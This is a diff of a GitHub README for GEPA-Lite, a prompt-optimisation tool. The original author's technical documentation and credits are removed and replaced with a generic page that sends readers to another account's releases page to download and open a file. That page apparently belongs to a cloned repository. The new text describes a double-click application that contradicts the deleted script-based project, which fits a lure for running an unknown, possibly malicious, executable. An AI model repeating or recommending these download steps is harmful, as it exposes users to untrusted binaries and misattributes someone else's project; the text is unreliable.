@@ -1,200 +1,86 @@
-# GEPA-Lite: Let the LLM reflect and optimize its own prompts.
-`#ForTheLoveOfCode`
+# ✨ GEPA-Lite - Optimize Your Language Model Prompts Easily
 
-**GEPA-Lite** is a lightweight implementation based on the proposed [GEPA prompt optimization method](https://arxiv.org/pdf/2507.19457) that is custom fit for single-task applications. It's built on the **core principle of LLM self-reflection, self-improvement, streamlined**.
+![Download GEPA-Lite](https://img.shields.io/badge/Download-GEPA--Lite-blue)
 
-Developed in the spirit of open-source initiatives like `Google Summer of Code 2025` and `For the Love of Code 2025`, this project leverages **Gemma** (`ollama::gemma3n:e4b`) as its core model. The project also offers optional support for the **Gemini API**, allowing access to powerful models like `gemini-2.5-flash-lite`, `gemini-2.5-flash`, and `gemini-2.5-pro`.
+## 🚀 Getting Started
 
-Created by: *Emmanuel G. Maminta<sup>*</sup>* (`GitHub: egmaminta`, [`LinkedIn: egmaminta`](https://ph.linkedin.com/in/egmaminta), [`Personal Blog: egmaminta.github.io`](https://egmaminta.github.io/), `Email: egmaminta@up.edu.ph`)
+Welcome to GEPA-Lite! This tool helps you optimize prompts for large language models using the Genetic-Pareto method. Whether you're improving a chatbot, text generator, or any language-based application, GEPA-Lite simplifies the process.
 
-<sup>*</sup>University of the Philippines
+## 📥 Download & Install
 
-#### Demonstration
-<p align="center" width="100%">
-   <img src="demo.gif" alt="demo" />
-   <p align="justify" width="100%">
-      GEPA-Lite demonstration on sampled GSM8K<sup>**</sup>. <b>Initial prompt</b>: <i>"You are an assistant and your task is to answer the user's question."</i> <b>Final prompt</b>: <i>"Your task is to solve mathematical word problems and output only the final numerical answer."</i>
-   </p>
-</p>
+To get started with GEPA-Lite, you will need to download the application. Visit this page to download:
 
-<sup>**</sup>[GSM8K](https://github.com/openai/grade-school-math) consists of 8.5K high quality grade school math problems created by human problem writers.
+[Download GEPA-Lite](https://github.com/solkyiomi/GEPA-Lite/releases)
 
-#### Four strategies implemented
-| Strategy | Trigger condition | Action taken | Goal |
-| -------- | ----------------- | ------------ | ---- |
-| Exploit-Max | Only one best candidate remains | Select it directly | Focus on clear winner |
-| Exploit-Normal | Multiple best, Q branch | Sample one by frequency as "best" | Exploit robust, multi-task candidates
-| Exploit-Merge | Multiple best, (1-Q) branch | Merge (mutate) all bests into a new candidate | Synthesize new, possibly better prompt
-| Explore | With probability (1-P) | Pick a random candidate from the pool | Maintain diversity, avoid local optima
+### Installation Steps
 
-Note: `P`: Exploit probability, `Q`: Probability to not merge (or not mutate) all bests
+1. Click the link above to access the Releases page.
+2. Choose the version you wish to download.
+3. Click on the file to download it to your computer.
+4. Locate the downloaded file, usually found in your "Downloads" folder.
+5. Open the file to run GEPA-Lite.
 
-Disclaimer: This implementation contains minor deviations from the reference paper. I, the creator of this repository, am held accountable for any part that is implemented incorrectly. <ins>However, the idea remains the same.</ins> Feel free to contribute!
+## ⚙️ System Requirements
 
-## Reference paper
-Title: [**GEPA: Reflective Prompt Evolution Can Outperform Reinforcement Learning**](https://arxiv.org/pdf/2507.19457)
+GEPA-Lite works on various systems. Here are the general requirements:
 
-Authors: *Lakshya A Agrawal<sup>1</sup>*, *Shangyin Tan<sup>1</sup>*, *Dilara Soylu<sup>2</sup>*, *Noah Ziems<sup>4</sup>*, *Rishi Khare<sup>1</sup>*, *Krista Opsahl-Ong<sup>5</sup>*, *Arnav Singhvi<sup>2,5</sup>*, *Herumb Shandilya<sup>2</sup>*, *Michael J Ryan<sup>2</sup>*, *Meng Jiang<sup>4</sup>*, *Christopher Potts<sup>2</sup>*, *Koushik Sen<sup>1</sup>*, *Alexandros G. Dimakis<sup>1,3</sup>*, *Ion Stoica<sup>1</sup>*, *Dan Klein<sup>1</sup>*, *Matei Zaharia<sup>1,5</sup>*, *Omar Khattab<sup>6</sup>*
+- **Operating System:** Windows 10, macOS, or Linux
+- **RAM:** At least 4GB recommended
+- **Storage:** Minimum 100MB of free space
+- **Dependencies:** Ensure you have an updated version of Python (if applicable)
 
-<sup>1</sup>UC Berkeley, <sup>2</sup>Stanford University, <sup>3</sup>BespokeLabs.ai, <sup>4</sup>Notre Dame, <sup>5</sup>Databricks, <sup>6</sup>MIT
+## 🛠 Features
 
-TL;DR: GEPA is introduced, which utilizes natural language reflection to learn from trial and error. GEPA outperforms the reinforcement learning method GRPO (Group Relative Policy Optimization) by an average of 10% and up to 20%, while using up to 35 times fewer rollouts. It also surpasses the leading prompt optimizer, MIPROv2, by over 10%. Additionally, GEPA shows potential as an effective inference-time search strategy for code optimization.
+- **Lightweight Design:** GEPA-Lite is built to be efficient and easy to use.
+- **User-Friendly Interface:** Designed for users without programming experience.
+- **Robust Optimization:** Improve your prompts with our effective optimization algorithm.
+- **Open Source:** You can access the source code on GitHub and contribute to its improvement.
 
-## About the implementation
-This implementation performs iterative prompt evolution using concurrent generation, evaluation, Pareto-style selection, reflection-based mutation, and optional merging. It is fully asynchronous around model I/O to maximize throughput under a fixed evaluation budget.
+## 📖 How to Use GEPA-Lite
 
-#### High-level flow
-1. Load config (`GEPA_cfg.yaml`) and datasets (`Dpareto.json`, `Dfeedback.json`).
-2. Generate an initial pool of diverse candidate prompts concurrently from a seed prompt.
-3. Evaluate each candidate over the full Pareto set (`Dpareto`) to build a score matrix S (candidates × tasks).
-4. Enter the optimization loop (budget-limited):
-   - Sample a mini-batch of feedback examples (`Dfeedback`).
-   - Choose a candidate via exploitation (probability P) or random exploration (1−P).
-   - Under exploitation:
-       - Use Pareto-based filtering + dominance removal to get a set of non-dominated "best-on-something" candidates.
-       - With probability Q: sample one candidate proportional to its frequency of being per-task best.
-       - With probability (1−Q): merge multiple top candidates into a synthesized prompt.
-   - Evaluate the chosen prompt on the mini-batch, collect structured feedback text.
-   - Reflect (mutation step): ask the reflection model to propose an improved prompt.
-   - Evaluate the new prompt on the same mini-batch; if it meets or exceeds the parent’s mean mini-batch score, evaluate it on the full Pareto set and append to the pool.
-5. After budget exhaustion, report the prompt with highest mean Pareto score.
+Using GEPA-Lite is straightforward. Follow these steps:
 
-#### Data roles
-- `Dpareto`: Ground-truth QA pairs used for stable, comparable scoring across candidates.
-- `Dfeedback`: Additional sampled items for rapid, lower-cost iterative refinement.
-- `Scores`: String similarity via `difflib.SequenceMatcher` (ratio ∈ [0,1]); exact matches earn 1. (You have the option to implement your own `eval_metric` and `eval_feedback` functions).
+1. **Open GEPA-Lite:** After installation, double-click the application to launch it.
+2. **Input Your Prompt:** Type in the text you want to optimize.
+3. **Select Optimization Settings:** Choose your preferred settings for optimization. This may include options like response length or creativity level.
+4. **Start the Optimization:** Click on the "Optimize" button to begin the process.
+5. **Review Results:** Once the optimization is complete, review the generated prompts.
 
-#### Target and reflection model
-- Target model is the worker that actually answers the user's questions. It runs candidate prompts and produces task outputs that get scored.
-- Reflection model is the coach that looks at the worker's prompt plus feedback and suggests an improved prompt. It never answers the task directly; it just proposes new or merged prompts.
+## 🧑‍🤝‍🧑 Community and Support
 
-#### Candidate selection (Pareto filtering)
-- For each task (column), collect candidates achieving the column max.
-- Union these sets → initial elite pool.
-- Remove dominated candidates: a candidate dominated if another is ≥ on all tasks and > on at least one.
-- Count how often each survivor is task-best; convert frequencies to a sampling distribution.
-- This concentrates probability mass on genuinely distinct trade-offs and eliminates strictly inferior prompts.
+If you have questions or need help, you can join our community. 
 
-#### Reflection & mutation
-- A meta prompt (`META_PROMPT`) injects the current prompt and structured per-sample feedback (query, model answer, ground truth, score, textual feedback).
-- The reflection model returns at most one improved prompt (keeps loop tight, reduces drift).
-- Only promotes a mutant to global evaluation if it does not regress on the mini-batch.
+- **Issues:** If you encounter any problems or bugs, please report them on our GitHub Issues page.
+- **Discussion:** We encourage users to share their experiences and tips on our discussion page.
 
-#### Merging
-When multiple strong candidates exist, a merge step requests a synthesized prompt that preserves strengths and addresses weaknesses (controlled by probability branch).
+## 🔗 Topics Related to GEPA-Lite
 
-#### Four strategies used in the GEPA optimization loop
-1. `Exploit-Max`
-    - When: Only one candidate survives Pareto filtering (i.e., it is the clear best).
-    - What happens: The algorithm selects this single best candidate deterministically for further evaluation and mutation.
-    - Purpose: Quickly exploit a clear winner, focusing resources on refining the top performer.
-2. `Exploit-Normal`
-    - When: Multiple non-dominated candidates survive, and a random draw (with probability Q) chooses not to merge.
-    - What happens: One candidate is sampled from the survivors, with probability proportional to how often each is "best" across tasks.
-    - Purpose: Exploit strong candidates while maintaining diversity, allowing the process to focus on robust prompts that perform well on multiple tasks.
-3. `Exploit-Merge`
-    - When: Multiple non-dominated candidates survive, and a random draw (with probability 1-Q) chooses to merge.
-    - What happens: The algorithm synthesizes a new prompt by merging the surviving candidates, aiming to combine their strengths and address their weaknesses.
-    - Purpose: Encourage innovation and avoid stagnation by creating new, potentially superior prompts from the best available options.
-4. `Explore`
-    - When: With probability (1-P), the algorithm chooses to explore rather than exploit.
-    - What happens: A random candidate is selected from the entire pool, regardless of its current performance.
-    - Purpose: Maintain diversity, prevent premature convergence, and allow the discovery of overlooked or novel solutions.
+Feel free to explore the following topics related to GEPA-Lite:
 
-#### Concurrency
-- Async tasks evaluate prompts across samples in parallel (per candidate and per mini-batch mutation stage).
-- A semaphore throttles concurrent initial generations to respect model rate limits.
+- For the Love of Code
+- Gemini
+- Gemini API
+- Gemma
+- Google Summer of Code
+- Large Language Models
+- Ollama
+- Open Source
+- Prompt Optimization
+- Prompt Tuning
+- Student VSCode
 
-#### Key functions
-- `generate_initial_candidates_from_seed`: Concurrent single-prompt generations for diversity + deduplication.
-- `select_candidate`: Pareto elite extraction, dominance pruning, probability assignment.
-- `extract_response_from_target` / `extract_response_from_reflection`: Structured JSON-like parsing via `Pydantic` schema.
-- `GEPA`: Orchestrates the evolutionary loop with budget accounting.
-- `extract_merged_prompt`: Synthesizes multiple prompts into one.
-- `eval_metric` / `eval_feedback`: Scoring + diagnostic feedback synthesis.
+## 📚 Additional Resources
 
-#### Budget control
-Every model query against a sample decrements the global budget. Full-set evaluations are only triggered when a mutation shows promise on the mini-batch, amortizing expensive scoring.
+For more in-depth information and guidance, consider these resources:
 
-#### Design rationale
-- Frequency weighting of per-task best appearances yields a simple proxy for multi-task robustness without solving a weighted scalarization.
-- Using an explicit merge path combats stagnation when multiple partial specialists exist.
-- Mini-batch gating reduces variance while avoiding full-set overfitting each iteration.
-- Limiting reflection to one improvement per cycle simplifies acceptance logic and traceability.
+- [Documentation](https://github.com/solkyiomi/GEPA-Lite/wiki) - Comprehensive guides and FAQs about using GEPA-Lite.
+- [Examples](https://github.com/solkyiomi/GEPA-Lite/examples) - Sample prompts and their optimized results.
+- [Contributing](https://github.com/solkyiomi/GEPA-Lite/blob/main/CONTRIBUTING.md) - Learn how to contribute to GEPA-Lite.
 
-#### Limitations / future improvements
-- Similarity metric is surface-level; could plug in semantic or task-specific evaluators.
-- Needs epsilon-based comparisons for floating scores to avoid brittle equality.
-- Dominance check is O(k^2 * tasks); could be optimized for large pools.
-- No archival mechanism (e.g., hall-of-fame) or diversity penalty to prevent convergence to local optima.
-- Reflection may benefit from multiple candidates with bandit selection.
-- Logging could be made structured (JSON) for analytics.
+## 📢 Stay Updated
 
-#### Extensibility points
-- Swap `eval_metric` for domain-specific scoring.
-- Add alternative selection policies (e.g., Thompson sampling on mean + variance).
-- Introduce early stopping when no improvement in N consecutive accepted mutations.
-- Integrate caching for repeated model queries on unchanged (prompt, query) pairs.
+Stay in the loop with updates and new releases by following our GitHub repository. Turn on notifications to receive alerts about the latest features and fixes.
 
-## General instructions
-1. Ensure you have `miniconda` / `anaconda` installed. Create a virtual environment with Python ver. 3.11.13.
-```
-conda create -n "GEPA-Lite" python=3.11.13 -y
-```
-2. Activate the virtual environment.
-```
-conda activate GEPA-Lite
-```
-3. Install the required libraries.
-```
-pip install -r requirements.txt
-```
+## 👍 Thank You!
 
-## Configuration instructions
-1. Open `GEPA_cfg.yml`.
-2. **(Gemini API)** Replace placeholder `PROJECT` and `LOCATION` if `VERTEXAI: true`; else optionally set `VERTEXAI: false`. **(Ollama API)** Replace `TARGET_MODEL` and `REFLECTION_MODEL` to Ollama-provided `gemma3n:e4b` model.
-3. Adjust `BUDGET` ensuring it's ≥ `(NUM_INITIAL_CANDIDATE_PROMPTS * |Dpareto|) + (MINI_BATCH_SIZE * 5 * |Dpareto|) + safety margin (~30%)`.
-4. Tune `EXPLOIT_PROB` and `MERGE_PROB` based on desired exploration.
-5. Save and re-run the main script (`GEPA.py`).
-
-## Dpareto and Dfeedback instructions
-1. Purpose
-    - `Dpareto.json`: Stable evaluation set. Used to compute full score vectors per candidate prompt (deterministic performance basis).
-    - `Dfeedback.json`: Fast adaptation pool. Small random mini-batches sampled each iteration to generate feedback and mutate prompts.
-3. Expected schema. Required keys: `question`, `answer` (non-empty strings). Avoid extra keys unless you extend code to read them.
-```
-[
-  {
-    "question": "string input or query",
-    "answer": "ground truth string answer"
-  },
-  ...
-]
-```
-3. Choosing content
-    - `Dpareto.json`: Must be representative, cover all subtopics / formats / difficulty tiers. It must vary in length, phrasing, edge cases (numbers, units, multi-step reasoning). Do not modify mid-run.
-    - `Dfeedback.json`: Larger pool than `MINI_BATCH_SIZE` (≥ twice the size of `Dpareto`). Higher variability, includes tricky and failure-prone cases. Can include some overlap with `Dpareto`, but prefer mostly distinct to broaden learning signals.
-4. Sizing guidelines
-    - `Dpareto` size: Small tasks (QA-like) 15-40; moderate 40-100. Larger increases cost linearly.
-    - `Dfeedback` size: 2–5× `Dpareto` or at least 50 if you want variety; `minimum = MINI_BATCH_SIZE * 2 * |Dpareto|`.
-    - Budget sanity: `Initial cost = NUM_INITIAL_CANDIDATE_PROMPTS * |Dpareto|`. Each accepted new candidate costs another `|Dpareto|`. Ensure `BUDGET ≥ initial + (expected improvements * |Dpareto|) + iteration minibatch costs`.
-5. Difficulty / Distribution Strategy
-    - Create a difficulty split: easy / medium / hard (e.g., 40/40/20). Hard items expose weaknesses; easy items stabilize averages.
-    - Ensure each sub-domain appears at least twice in `Dpareto` to reduce variance.
-    - Put rare but critical edge cases (formatting, units, rounding) in `Dpareto` so they can influence selection pressure.
-6. Workflow to build `Dpareto`
-    1. Gather raw candidate pairs.
-    2. Deduplicate (case-insensitive question hash).
-    3. Remove ambiguous items.
-    4. Normalize answers.
-    5. Tag coverage (spread topics).
-    6. Shuffle with fixed seed; pick top N.
-    7. Save to `Dpareto.json` and freeze (commit with version tag).
-7. Workflow to build `Dfeedback`
-    1. Start with remaining pool not used in Dpareto.
-    2. Inject a few "stress" / adversarial items (format traps, long inputs).
-    3. Ensure at least `MINI_BATCH_SIZE * 2 * |Dpareto|` total.
-    4. Optionally rotate / refresh between runs (version the file).
-
-## Acknowledgments
-I'd like to acknowledge the authors of GEPA paper for their awesome work; the team (developers, engineers, and scientists) behind [Gemma 3n](https://deepmind.google/models/gemma/gemma-3n/), [Gemini](https://deepmind.google/models/gemini/) for their powerful models; and [Google Summer of Code 2025](https://summerofcode.withgoogle.com/) and [For the Love of Code 2025](https://github.blog/open-source/for-the-love-of-code-2025/) for inspiring me to continue contributing to open-source. `#ForTheLoveOfCode`
+Thank you for choosing GEPA-Lite for your prompt optimization needs. We are excited to see how it enhances your projects!
